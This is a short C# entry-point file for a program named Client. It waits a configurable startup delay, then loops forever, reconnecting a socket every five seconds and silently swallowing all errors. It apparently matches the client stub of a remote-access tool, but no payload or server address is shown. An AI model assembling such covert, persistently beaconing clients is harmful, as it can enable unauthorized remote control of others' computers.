using System;
using System.Threading;
using Client.Connection;

namespace Client
{
    internal class Program
    {
        static void Main(string[] args)
        {

            for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++)
            {
                Thread.Sleep(1000);
            }

            while (true) // ~ loop to check socket status
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch { }
                Thread.Sleep(5000);
            }


        }
    }
}
